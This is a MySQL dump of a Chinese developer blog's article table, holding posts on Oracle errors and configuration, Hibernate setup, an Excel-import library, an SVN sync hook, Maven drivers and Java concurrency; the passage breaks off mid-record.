
CREATE DATABASE focusphp CHARSET UTF8;
USE focusphp;

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- 数据库: `focusphp`
--


--
-- 表的结构 `ar_article`
--

CREATE TABLE IF NOT EXISTS `ar_article` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `title` varchar(200) NOT NULL COMMENT '文章标题',
  `content` text COMMENT '文章内容',
  `intro` varchar(500) DEFAULT NULL COMMENT '文章介绍',
  `feature_img` varchar(200) DEFAULT NULL COMMENT '特色图片',
  `author` varchar(100) DEFAULT NULL COMMENT '文章作者',
  `source` varchar(200) DEFAULT NULL COMMENT '文章来源',
  `isvalid` smallint(1) DEFAULT '1' COMMENT '是否有效',
  `creator` int(11) DEFAULT NULL COMMENT '创建者',
  `publish_date` int(11) DEFAULT NULL COMMENT '发布时间',
  `update_date` int(11) DEFAULT NULL COMMENT '更新时间',
  `updator` int(11) DEFAULT NULL COMMENT '更新者',
  `model` varchar(20) NOT NULL DEFAULT 'html' COMMENT '文章模型',
  PRIMARY KEY (`id`),
  KEY `title` (`title`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='文章表' AUTO_INCREMENT=424 ;

--
-- 转存表中的数据 `ar_article`
--

INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(323, '解决Oracle错误：ORA-06592 Case Not Found', '<p>在Oracle 10g中，通过触发器在两个数据库之间传递数据，但是程序中总是抛出如下错误：</p><pre class="brush:java;toolbar:false">ORA-01438:&nbsp;value&nbsp;larger&nbsp;than&nbsp;specified&nbsp;precision&nbsp;allowed&nbsp;for&nbsp;this&nbsp;column</pre><p>提示某一列精度不对，但是却没有提示出是那一列，经过仔细检查，始终没有发现问题原因，于是尝试直接在PL/SQL中执行一次插入命令，看看触发器是否正常工作，但是这次依然不成功，报错ORA-06592, 提示缺少CASE。</p><p><br/></p><p>经过不断的搜索，终于在网上找到了解决办法，CASE语句中添加上ELSE语句即可。</p><pre class="brush:java;toolbar:false">CASE\r\n&nbsp;&nbsp;&nbsp;&nbsp;WHEN&nbsp;...\r\n&nbsp;&nbsp;&nbsp;&nbsp;ELSE\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL;\r\nEND&nbsp;CASE;</pre><p>修改触发器之后，从PLSQL中插入成功，又试了一下通过此程序插入，竟然也成功了！</p><p><br/></p><p>不知道之间有什么关联，对Oracle没什么研究，就此记录一下，以后遇到类似问题以便解决。</p>', '在Oracle 10g中，通过触发器在两个数据库之间传递数据，但是程序中总是抛出如下错误。\r\n提示某一列精度不对，但是却没有提示出是那一列，经过仔细检查，始终没有发现问题原因，于是尝试直接在PL/SQL中执行一次插入命令，看看触发器是否正常工作，但是这次依然不成功，报错ORA-06592, 提示缺少CASE', 'http://agiledev-arsenals.stor.sinaapp.com/cover/4b64535a3a52ec18090443a8d8b8b2dd.gif', 'mylxsw', '原创', 1, 0, 1396509112, 1396666049, 0, 'html'),
(316, '安装Oracle10g XE之后修改字符集解决中文乱码	', '<p>在安装Oracle 10G XE版本之后，由于默认字符集原因，中文是乱码的，通过调整字符集，解决中文乱码问题。</p><pre class="brush:bash;toolbar:false">C:\\Users\\guan&gt;sqlplus\r\nSQL*Plus:&nbsp;Release&nbsp;10.2.0.1.0&nbsp;-&nbsp;Production&nbsp;on&nbsp;星期六&nbsp;11月&nbsp;2&nbsp;23:56:23&nbsp;2013\r\nCopyright&nbsp;(c)&nbsp;1982,&nbsp;2005,&nbsp;Oracle.&nbsp;&nbsp;All&nbsp;rights&nbsp;reserved.\r\nEnter&nbsp;user-name:&nbsp;sys&nbsp;as&nbsp;sysdba\r\nEnter&nbsp;password:</pre><p>&nbsp; 登陆后，执行以下命令：<br/></p><pre class="brush:bash;toolbar:false">SQL&gt;&nbsp;shutdown&nbsp;immediate;\r\nSQL&gt;&nbsp;startup&nbsp;mount\r\nORACLE&nbsp;instance&nbsp;started.\r\n\r\nTotal&nbsp;System&nbsp;Global&nbsp;Area&nbsp;&nbsp;805306368&nbsp;bytes\r\nFixed&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1289996&nbsp;bytes\r\nVariable&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;218104052&nbsp;bytes\r\nDatabase&nbsp;Buffers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;583008256&nbsp;bytes\r\nRedo&nbsp;Buffers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2904064&nbsp;bytes\r\nDatabase&nbsp;mounted.\r\nSQL&gt;&nbsp;alter&nbsp;session&nbsp;set&nbsp;sql_trace=true;\r\n\r\nSession&nbsp;altered.\r\n\r\nSQL&gt;&nbsp;alter&nbsp;system&nbsp;enable&nbsp;restricted&nbsp;session;\r\n\r\nSystem&nbsp;altered.\r\n\r\nSQL&gt;&nbsp;alter&nbsp;system&nbsp;set&nbsp;job_queue_processes=0;\r\n\r\nSystem&nbsp;altered.\r\n\r\nSQL&gt;&nbsp;alter&nbsp;system&nbsp;set&nbsp;aq_tm_processes=0;\r\n\r\nSystem&nbsp;altered.\r\n\r\nSQL&gt;&nbsp;alter&nbsp;database&nbsp;open;\r\n\r\nDatabase&nbsp;altered.\r\nSQL&gt;&nbsp;alter&nbsp;database&nbsp;character&nbsp;set&nbsp;internal_use&nbsp;AL32UTF8;\r\n\r\nDatabase&nbsp;altered.\r\n\r\nSQL&gt;&nbsp;shutdown&nbsp;immediate;\r\nDatabase&nbsp;closed.\r\nDatabase&nbsp;dismounted.\r\nORACLE&nbsp;instance&nbsp;shut&nbsp;down.\r\nSQL&gt;&nbsp;startup\r\nORACLE&nbsp;instance&nbsp;started.\r\n\r\nTotal&nbsp;System&nbsp;Global&nbsp;Area&nbsp;&nbsp;805306368&nbsp;bytes\r\nFixed&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1289996&nbsp;bytes\r\nVariable&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;218104052&nbsp;bytes\r\nDatabase&nbsp;Buffers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;583008256&nbsp;bytes\r\nRedo&nbsp;Buffers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2904064&nbsp;bytes\r\nDatabase&nbsp;mounted.\r\nDatabase&nbsp;opened.</pre><p><br/></p>', '在安装Oracle 10G XE版本之后，由于默认字符集原因，中文是乱码的，通过调整字符集，解决中文乱码问题', 'http://agiledev-arsenals.stor.sinaapp.com/cover/4b64535a3a52ec18090443a8d8b8b2dd.gif', 'cdcafe', '原创', 1, 0, 1393472287, 1396520117, 0, 'html'),
(318, 'Hibernate笔记 (1)', '<p>创建第一个Hibernate程序</p><p>使用MyEclipse8</p><p>1. 创建java项目， 加入Hibernate开发能力。</p><p>2. Hibernate配置文件（hibernate.cfg.xml） &nbsp;&nbsp;</p><p><br/></p><pre class="brush:java; toolbar: true; auto-links: true;">&lt;?xml&nbsp;version=&#39;1.0&#39;&nbsp;encoding=&#39;UTF-8&#39;?&gt;\r\n&lt;!DOCTYPE&nbsp;hibernate-configuration&nbsp;PUBLIC\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;-//Hibernate/Hibernate&nbsp;Configuration&nbsp;DTD&nbsp;3.0//EN&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd&quot;&gt;\r\n\r\n&lt;!--&nbsp;Generated&nbsp;by&nbsp;MyEclipse&nbsp;Hibernate&nbsp;Tools.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--&gt;\r\n&lt;hibernate-configuration&gt;\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;session-factory&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;property&nbsp;name=&quot;hbm2ddl.auto&quot;&gt;update&lt;/property&gt;&lt;!--&nbsp;自动创建数据表&nbsp;--&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;property&nbsp;name=&quot;dialect&quot;&gt;org.hibernate.dialect.MySQLDialect&lt;/property&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;property&nbsp;name=&quot;connection.url&quot;&gt;jdbc:mysql://localhost:3306/test&lt;/property&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;property&nbsp;name=&quot;connection.username&quot;&gt;root&lt;/property&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;property&nbsp;name=&quot;connection.driver_class&quot;&gt;com.mysql.jdbc.Driver&lt;/property&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;	\r\n&nbsp;&nbsp;&nbsp;&nbsp;	\r\n&nbsp;&nbsp;&nbsp;&nbsp;	&lt;mapping&nbsp;resource=&quot;com/ithinkblog/po/News.hbm.xml&quot;/&gt;&lt;!--&nbsp;Hibernate映射文件&nbsp;--&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;/session-factory&gt;\r\n\r\n&lt;/hibernate-configuration&gt;</pre><p>3. 创建PO（News.java)</p><p><br/></p><p><br/></p><pre class="brush:java; toolbar: true; auto-links: true;">package&nbsp;com.ithinkblog.po;\r\n\r\npublic&nbsp;class&nbsp;News&nbsp;{\r\n	private&nbsp;Integer&nbsp;id;\r\n	private&nbsp;String&nbsp;title;\r\n	private&nbsp;String&nbsp;content;\r\n	\r\n	public&nbsp;Integer&nbsp;getId()&nbsp;{\r\n		return&nbsp;id;\r\n	}\r\n	public&nbsp;void&nbsp;setId(Integer&nbsp;id)&nbsp;{\r\n		this.id&nbsp;=&nbsp;id;\r\n	}\r\n	public&nbsp;String&nbsp;getTitle()&nbsp;{\r\n		return&nbsp;title;\r\n	}\r\n	public&nbsp;void&nbsp;setTitle(String&nbsp;title)&nbsp;{\r\n		this.title&nbsp;=&nbsp;title;\r\n	}\r\n	public&nbsp;String&nbsp;getContent()&nbsp;{\r\n		return&nbsp;content;\r\n	}\r\n	public&nbsp;void&nbsp;setContent(String&nbsp;content)&nbsp;{\r\n		this.content&nbsp;=&nbsp;content;\r\n	}\r\n	\r\n}</pre><p>4. 创建映射文件（News.hbm.xml）</p><p></p><pre class="brush:java; toolbar: true; auto-links: true;">&lt;?xml&nbsp;version=&quot;1.0&quot;?&gt;\r\n&lt;!DOCTYPE&nbsp;hibernate-mapping&nbsp;PUBLIC\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;-//Hibernate/Hibernate&nbsp;Mapping&nbsp;DTD&nbsp;3.0//EN&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd&quot;&gt;\r\n\r\n&lt;hibernate-mapping&nbsp;package=&quot;com.ithinkblog.po&quot;&gt;\r\n	&lt;class&nbsp;name=&quot;News&quot;&nbsp;table=&quot;news_table&quot;&gt;\r\n		&lt;id&nbsp;name=&quot;id&quot;&gt;\r\n			&lt;generator&nbsp;class=&quot;identity&quot;&gt;&lt;/generator&gt;\r\n		&lt;/id&gt;\r\n		&lt;property&nbsp;name=&quot;title&quot;&gt;&lt;/property&gt;\r\n		&lt;property&nbsp;name=&quot;content&quot;&gt;&lt;/property&gt;\r\n	&lt;/class&gt;\r\n&lt;/hibernate-mapping&gt;</pre><p>代码模板可以在开发文档中找到</p><p></p><p>5. 测试用例</p><p></p><pre class="brush:java; toolbar: true; auto-links: true;">package&nbsp;test;\r\n\r\nimport&nbsp;org.hibernate.SessionFactory;\r\nimport&nbsp;org.hibernate.Transaction;\r\nimport&nbsp;org.hibernate.cfg.Configuration;\r\nimport&nbsp;org.hibernate.classic.Session;\r\n\r\nimport&nbsp;com.ithinkblog.po.News;\r\n\r\n\r\npublic&nbsp;class&nbsp;Test&nbsp;{\r\n	@org.junit.Test\r\n	public&nbsp;void&nbsp;test(){\r\n		Configuration&nbsp;conf&nbsp;=&nbsp;new&nbsp;Configuration().configure();//初始化配置文件\r\n		SessionFactory&nbsp;sessionFactory&nbsp;=&nbsp;conf.buildSessionFactory();//创建session工厂\r\n		Session&nbsp;session&nbsp;&nbsp;=&nbsp;sessionFactory.openSession();//打开session\r\n		Transaction&nbsp;tx&nbsp;=&nbsp;session.beginTransaction();//开始一个事务\r\n		\r\n		News&nbsp;n&nbsp;=&nbsp;new&nbsp;News();\r\n		n.setTitle(&quot;testNews1&quot;);\r\n		n.setContent(&quot;Hello,world&quot;);\r\n		\r\n		session.save(n);\r\n		\r\n		tx.commit();//提交事务\r\n		session.close();\r\n		sessionFactory.close();\r\n	}\r\n}</pre><p></p><p>&nbsp;</p><p>当然，还要在classpath中添加mysql的jdbc驱动程序。</p><p><br/></p>', '这是学习Hibernate过程中记录的笔记。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/bd9378c1c71a4e5253366edb18673095.jpg', 'admin', '原创', 1, NULL, 1349762386, 1393501706, 0, 'html'),
(319, 'ExcelToEntity 使用说明', '<p>该类库（Excel2Entity, 简称e2e）对POI对xls文件的读取进行了封装，实现了批量导入Excel中的数据时自动将数据填充到实体列表的功能， 支持字段类型校验以及自定义校验规则，可以对Excel中的数据类型合法性进行校验，同时e2e提供了一定的扩展性，可以自定义校验规则以及自定义实体对象字段类型实现更加负责的校验以及字段类型填充。</p><ul class=" list-paddingleft-2" style="list-style-type: disc;"><li><p><span style="font-size: 20px;"><strong>Excel2Entity依赖于Apache POI类库。</strong></span></p></li><li><p><span style="font-size: 20px;"><strong>项目基于Maven。</strong></span></p></li><li><p><span style="font-size: 20px;"><strong>项目托管在Github。</strong></span><br/></p></li></ul><pre class="brush:html;toolbar:false">https://github.com/mylxsw/Excel2Entity.git</pre><p><br/></p><ul class=" list-paddingleft-2" style="list-style-type: disc;"><li><p><span style="font-size: 20px;"><strong>使用方法：</strong></span></p></li></ul><p><br/></p><p>&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size: 18px;">1. 普通实体创建</span><br/></p><p>&nbsp; &nbsp;&nbsp;</p><pre class="brush:java;toolbar:false">ExcelHelper&nbsp;eh&nbsp;=&nbsp;ExcelHelper.readExcel(&quot;111.xls&quot;);\r\nList&lt;Demo&gt;&nbsp;entitys&nbsp;&nbsp;=&nbsp;null;\r\ntry&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;entitys&nbsp;=&nbsp;eh.toEntitys(Demo.class);\r\n&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(Demo&nbsp;d&nbsp;:&nbsp;entitys)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(d.toString());\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}&nbsp;catch&nbsp;(ExcelParseException&nbsp;e)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(e.getMessage());\r\n}&nbsp;catch&nbsp;(ExcelContentInvalidException&nbsp;e)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(e.getMessage());\r\n}&nbsp;catch&nbsp;(ExcelRegexpValidFailedException&nbsp;e)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(e.getMessage());\r\n}</pre><p>&nbsp;&nbsp;<span style="font-size: 18px;">&nbsp;&nbsp;2. 注册新的字段类型</span><br/></p><p>&nbsp;&nbsp;&nbsp;&nbsp;注册的新的字段类型类必须实现ExcelType抽象类。</p><pre class="brush:java;toolbar:false">ExcelHelper.registerNewType(MyDataType.class);</pre><p>&nbsp;&nbsp;&nbsp;<span style="font-size: 18px;">&nbsp;3. 实体对象</span><br/></p><p>&nbsp;&nbsp;&nbsp;&nbsp;实体类必须标注@ExcelEntity注解， 同时需要填充的字段标注@ExcelProperty注解<br/></p><p>&nbsp;&nbsp;&nbsp;&nbsp;</p><pre class="brush:java;toolbar:false">@ExcelEntity\r\npublic&nbsp;class&nbsp;Demo&nbsp;{\r\n	@ExcelProperty(value=&quot;Name&quot;,&nbsp;rule=MyStringCheckRule.class)\r\n	private&nbsp;String&nbsp;name;\r\n\r\n	@ExcelProperty(&quot;Sex&quot;)\r\n	private&nbsp;String&nbsp;sex;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;基于正则表达式的字段校验\r\n	@ExcelProperty(value=&quot;Age&quot;,&nbsp;regexp=&quot;^[1-4]{1}[0-9]{1}$&quot;,&nbsp;regexpErrorMessage=&quot;年龄必须在10-49岁之间&quot;)\r\n	private&nbsp;int&nbsp;age;\r\n\r\n	@ExcelProperty(value=&quot;Tel&quot;)\r\n	private&nbsp;Long&nbsp;tel;\r\n	\r\n	@ExcelProperty(&quot;创建时间&quot;)\r\n	private&nbsp;Timestamp&nbsp;createDate;\r\n	\r\n	@ExcelProperty(value=&quot;Name&quot;,&nbsp;required=true)\r\n	private&nbsp;MyDataType&nbsp;name2;\r\n	\r\n\r\n...&nbsp;[get/set方法]\r\n}</pre><p><span style="font-size: 18px;">&nbsp;&nbsp;&nbsp;&nbsp;4. 自定义校验规则</span><br/></p><p>&nbsp;&nbsp;&nbsp;&nbsp;自定义校验规则必须实现ExcelRule接口</p><pre class="brush:java;toolbar:false">public&nbsp;class&nbsp;MyStringCheckRule&nbsp;implements&nbsp;ExcelRule&lt;String&gt;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;字段检查\r\n	public&nbsp;void&nbsp;check(Object&nbsp;value,&nbsp;String&nbsp;columnName,&nbsp;String&nbsp;fieldName)&nbsp;throws&nbsp;ExcelContentInvalidException&nbsp;{\r\n		String&nbsp;val&nbsp;=&nbsp;(String)&nbsp;value;\r\n		System.out.println(&quot;--------&gt;&nbsp;&nbsp;&nbsp;检测的列名为&nbsp;&nbsp;&quot;&nbsp;+&nbsp;columnName&nbsp;+&nbsp;&quot;，&nbsp;填充的字段名为&nbsp;&quot;&nbsp;+&nbsp;fieldName&nbsp;);\r\n		if(val.length()&nbsp;&gt;&nbsp;10){\r\n			throw&nbsp;new&nbsp;ExcelContentInvalidException(&quot;内容超长!&quot;);\r\n		}\r\n	}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;结果修改\r\n	public&nbsp;String&nbsp;filter(Object&nbsp;value,&nbsp;String&nbsp;columnName,&nbsp;String&nbsp;fieldName)&nbsp;{\r\n		String&nbsp;val&nbsp;=&nbsp;(String)&nbsp;value;\r\n		return&nbsp;&quot;[[[[&quot;&nbsp;+&nbsp;val&nbsp;+&nbsp;&quot;]]]&quot;;\r\n	}\r\n\r\n}</pre><p><br/></p>', '该类库（Excel2Entity, 简称e2e）对POI对xls文件的读取进行了封装，实现了批量导入Excel中的数据时自动将数据填充到实体列表的功能， 支持字段类型校验以及自定义校验规则，可以对Excel中的数据类型合法性进行校验，同时e2e提供了一定的扩展性，可以自定义校验规则以及自定义实体对象字段类型实现更加负责的校验以及字段类型填充。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/977006edb75a1eca2d7f63a84e49a43a.jpg', 'admin', '原创', 1, NULL, NULL, 1407993252, 0, 'html'),
(326, 'SVN内容同步更新', '<p>实现SVN内容同步更新，当进行文件提交的时候，自动将提交的内容更新到另一个位置。</p><p>如同步更新到Web服务器以实现即时发布。</p><p><br/></p><p>在仓库目录下的 hooks文件夹下，建立post-commit.bat文件。<br/></p><pre class="brush:bash;toolbar:false;">@echo&nbsp;off\r\n&quot;D:\\Program&nbsp;Files\\VisualSVN\\bin\\svn.exe&quot;&nbsp;update&nbsp;&quot;E:\\BaiDuYun\\备份资料\\SVN备份&quot;&nbsp;–username&nbsp;testuser&nbsp;–password&nbsp;testpwd</pre><p><br/></p><p>如果出现文件只读等错误，则需要修改Svn服务器的执行权限。</p><p>在服务中的SVN服务中修改SVN的登陆身份为administrator即可。</p>', '实现SVN内容同步更新，当进行文件提交的时候，自动将提交的内容更新到另一个位置。\r\n如同步更新到Web服务器以实现即时发布。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/6078c895f95a3d8008aebdb4a88519c8.jpg', 'mylxsw', '整理', 1, 0, 1396512502, NULL, NULL, 'html'),
(325, 'Oracle XE安装后占用8080端口', '<p>解决Oracle占用8080端口问题</p><p>初次安装Oracle 10g XE之后，会发现Oracle会占用8080端口，而在进行java web开发过程中，一般情况下Tomcat会使用该端口，为避免冲突，我们需要修改Oracle对该端口的占用。</p><pre class="brush:ps;toolbar:false;">Oracle&nbsp;10g：call&nbsp;dbms_xdb.cfg_update(updateXML(dbms_xdb.cfg_get(),&#39;/xdbconfig/sysconfig/protocolconfig/httpconfig/http-port/text()&#39;,9090));</pre><p><br/></p>', '初次安装Oracle 10g XE之后，会发现Oracle会占用8080端口，而在进行java web开发过程中，一般情况下Tomcat会使用该端口，为避免冲突，我们需要修改Oracle对该端口的占用。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/4b64535a3a52ec18090443a8d8b8b2dd.gif', 'mylxsw', '整理', 1, 0, 1396512251, 1396666028, 0, 'html'),
(327, '为Maven添加Oracle驱动', '<p>本文讲述了在使用Maven过程中，当需要用到非公开库例如Oracle驱动时的解决办法，将第三方驱动加入到本地Maven仓库中，以便项目直接获取。</p><pre class="brush:bash;toolbar:false;">mvn&nbsp;install:install-file&nbsp;-DgroupId=com.oracle&nbsp;-DartifactId=ojdbc14&nbsp;-Dversion=10.2.0.1.0&nbsp;-Dpackaging=jar&nbsp;-Dfile=ojdbc14.jar&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;\r\nmvn&nbsp;install:install-file&nbsp;-DgroupId=com.oracle&nbsp;-DartifactId=ojdbc6&nbsp;-Dversion=11.2.0.1.0&nbsp;-Dpackaging=jar&nbsp;-Dfile=ojdbc6.jar</pre><pre class="brush:xml;toolbar:false;">&lt;dependency&gt;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;com.oracle&lt;/groupId&gt;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;ojdbc6&lt;/artifactId&gt;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;11.2.0.1.0&lt;/version&gt;&nbsp;&nbsp;\r\n&lt;/dependency&gt;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&lt;dependency&gt;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;com.oracle&lt;/groupId&gt;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;ojdbc14&lt;/artifactId&gt;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;10.2.0.1.0&lt;/version&gt;&nbsp;&nbsp;\r\n&lt;/dependency&gt;</pre><p>原文：<a href="http://blog.sina.com.cn/s/blog_3f7823220100z6j5.html">http://blog.sina.com.cn/s/blog_3f7823220100z6j5.html</a></p>', '本文讲述了在使用Maven过程中，当需要用到非公开库例如Oracle驱动时的解决办法，将第三方驱动加入到本地Maven仓库中，以便项目直接获取。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/754a5d27f3f6b920e54b4d24cf537cce.jpg', 'mylxsw', '转载', 1, 0, 1396512662, 1396666006, 0, 'html'),
(328, 'Spring ROO  项目编译出现找不到org/apache/log4j/Level', '<p>在使用Maven编译roo项目的时候，出现找不到org/apache/log4j/Level的错误，但是log4j相关的包确实都在，仍然报错：</p><pre class="brush:java;toolbar:false;">Tests&nbsp;in&nbsp;error:\r\n&nbsp;&nbsp;initializationError(name.orionis.roo.domain.RbacUserIntegrationTest):&nbsp;org/apache/log4j/Level</pre><p>解决办法：</p><pre class="brush:html;toolbar:false;">1.&nbsp;修改pom.xml中java版本为系统使用的版本，比如我的显示是1.6，但是我用的是1.7，因此修改为1.7\r\n2.&nbsp;将log4j和slf修改为最新版本\r\n&nbsp;\r\n&lt;java.version&gt;1.7&lt;/java.version&gt;\r\n&lt;slf4j.version&gt;1.7.2&lt;/slf4j.version&gt;\r\n&nbsp;\r\n&nbsp;\r\n&lt;dependency&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;log4j&lt;/groupId&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;log4j&lt;/artifactId&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;1.2.17&lt;/version&gt;\r\n&lt;/dependency&gt;</pre><p><br/></p>', '在使用Maven编译roo项目的时候，出现找不到org/apache/log4j/Level的错误，但是log4j相关的包确实都在，仍然报错', 'http://agiledev-arsenals.stor.sinaapp.com/cover/347bd989d0affe3ea4d62b2d6f3164b0.jpg', 'mylxsw', '整理', 1, 0, 1396512775, 1396521449, 0, 'html'),
(329, '阐释Java中的volatile和synchronizated', '<p>最好的理解方式是通过查看volatile和synchronized的不同效果。volatile是一个字段修饰符，而synchronized则用来修饰一个代码块或者是方法。因此，我们可以列出使用这两个关键字的三种不同的访问方式：<br/></p><pre class="brush:java;toolbar:false;">int&nbsp;i1;&nbsp;\r\nint&nbsp;geti1(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;i1;\r\n}\r\n&nbsp;&nbsp;\r\nvolatile&nbsp;int&nbsp;i2;\r\nint&nbsp;geti2(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;i2;\r\n}\r\n&nbsp;&nbsp;\r\nint&nbsp;i3;\r\nsynchronized&nbsp;int&nbsp;geti3(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;i3;\r\n}</pre><p>geti1()访问存储在当前线程中的值。线程可以有一个变量的本地副本，不同线程中的数据是不相同的。特别的，另一个线程在他自己的线程中更新了i1的话，但是当前线程中保存的i1的值与这个更新了的i1是不同的。事实上，在java中有一个主内存的概念，这个内存区域存储了了变量当前&quot;正确&quot;的值。线程中也有他们自己对这个变量的副本，在线程中，这个副本与主内存中的变量的值是不同的。所以，对于主内存来说，它所持有的i1的值可能是1，而线程1的值可能是2，而线程2的值可能是3.如果线程2和线程3都更新了这个i1的值，对主内存和其他线程来说是没有影响的。<br/></p><p>另一方面，geti2（）邮箱的从主内存中访问了i2的值。volatile变量是不允许不同的线程中存储该变量的副本的。一个声明为volatile的变量必须保证数据在所有线程中的同步，无论在哪个线程中更新或者是访问这个变量，所有的其它线程都是直接可以看到同样的值的。当然，volatile变量比普通变量有着更高的访问和更新开销，因此，线程有自己的数据副本是更加高效的。</p><p>如果volatile已经在跨线程中同步了，那synchronized又是什么呢？这里有两点不同：</p><p>首先，synchronized获取和释放一个监控锁，如果两个线程使用同样的监控锁的话，可以强制在同一时间只有一个线程执行代码块。但是synchronized也同步内存。事实上synchronized同步了整个线程的内存和主内存。所以执行geti3做了如下操作：</p><p>1. 线程获取this对象的监控锁（假设监控者没有被锁，否则线程将会等待知道它释放这个锁）</p><p>2. 线程内存刷新它所有的变量，例如，它所有的变量从主内存中读取</p><p>3. 代码块被执行（这里设置当前的i3返回值，可能刚刚从主内存中重置）</p><p>4. 任何对变量的改变可能已经写到了主内存， 但是对geti3()来说，这里并没有任何改变</p><p>5. 